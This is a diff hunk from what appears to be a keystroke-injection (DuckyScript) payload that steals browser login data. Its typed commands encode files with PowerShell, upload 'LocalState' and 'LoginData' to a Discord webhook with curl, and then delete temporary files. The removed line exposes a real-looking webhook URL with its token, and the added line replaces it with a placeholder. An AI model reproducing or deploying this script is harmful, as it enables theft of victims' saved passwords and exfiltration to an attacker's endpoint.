@@ -26,7 +26,7 @@ STRING powershell -NoProfile -Command "$encodedFile = [Convert]::ToBase64String(
 ENTER
 DELAY 1000
 REM Send the files to the Discord webhook
-STRING curl -X POST -F "file1=@LocalState" -F "file2=@%USERPROFILE%\Desktop\LoginData" "https://discord.com/api/webhooks/1118980630282252371/m9ro4voI7kGkxT1glLFvx_E_1b3b2oedM5fwd5hRuguubA-lP0bl6VE-fR3HNmv0o2gd"
+STRING curl -X POST -F "file1=@LocalState" -F "file2=@%USERPROFILE%\Desktop\LoginData" "webhook here"
 ENTER
 DELAY 3000
 REM Clean up by deleting the temporary files
